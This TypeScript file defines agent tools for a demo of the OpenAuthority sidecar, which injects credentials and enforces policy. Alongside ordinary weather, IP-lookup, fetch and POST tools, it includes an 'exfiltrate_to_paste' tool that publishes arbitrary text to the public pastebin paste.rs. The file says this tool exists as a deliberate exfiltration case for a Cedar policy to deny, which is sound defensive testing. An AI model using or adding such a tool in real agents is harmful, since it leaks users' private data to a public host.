import { FunctionTool } from '@google/adk';
import { z } from 'zod';

export const getWeather = new FunctionTool({
  name: 'get_weather',
  description: 'Get current weather for a city using wttr.in.',
  parameters: z.object({
    city: z.string().describe('City name'),
  }),
  async execute({ city }) {
    const res = await fetch(`https://wttr.in/${encodeURIComponent(city)}?format=j1`);
    if (!res.ok) return { error: `wttr.in returned ${res.status}` };
    let data = await res.json();
    if ('data' in data) data = data.data;
    const cur = data.current_condition[0];
    return {
      city,
      description: cur.weatherDesc[0].value,
      temperature_c: cur.temp_C,
      humidity: cur.humidity,
      wind_kmph: cur.windspeedKmph,
    };
  },
});

export const getIpInfo = new FunctionTool({
  name: 'get_ip_info',
  description:
    'Get IP address information from ipinfo.io. The agent calls https://ipinfo.io/json ' +
    'with no credentials. When the OpenAuthority sidecar is in front of the agent, it injects ' +
    'the IPINFO_TOKEN as an Authorization: Bearer <token> header before the request ' +
    'leaves the host. The agent process never sees the token — this is the canonical ' +
    'OpenAuthority credential-injection demo.',
  parameters: z.object({}),
  async execute() {
    const res = await fetch('https://ipinfo.io/json');
    if (!res.ok) return { error: `ipinfo.io returned ${res.status}` };
    return await res.json();
  },
});

export const fetchUrl = new FunctionTool({
  name: 'fetch_url',
  description: 'Fetch content from a URL and return the response text.',
  parameters: z.object({
    url: z.string().describe('URL to fetch'),
  }),
  async execute({ url }) {
    const res = await fetch(url);
    if (!res.ok) return { error: `Request returned ${res.status}` };
    return await res.text();
  },
});

export const postData = new FunctionTool({
  name: 'post_data',
  description: 'Post data to a URL and return the response.',
  parameters: z.object({
    url: z.string().describe('URL to post to'),
    data: z.string().describe('Data to send'),
  }),
  async execute({ url, data }) {
    const res = await fetch(url, { method: 'POST', body: data });
    if (!res.ok) return { error: `Request returned ${res.status}` };
    return await res.text();
  },
});

export const exfiltrateToPaste = new FunctionTool({
  name: 'exfiltrate_to_paste',
  description:
    'Publish arbitrary text to the public pastebin at paste.rs and return the paste URL. ' +
    'This tool is intentionally dangerous: it models data exfiltration. OpenAuthority\'s example ' +
    'Cedar policy denies POSTs to paste.rs at the sidecar, which is what turns this into ' +
    "the demo's one-command DENY scenario.",
  parameters: z.object({
    data: z.string().describe('Text to publish'),
  }),
  async execute({ data }) {
    const res = await fetch('https://paste.rs', { method: 'POST', body: data });
    if (!res.ok) return { error: `paste.rs returned ${res.status}` };
    return (await res.text()).trim();
  },
});
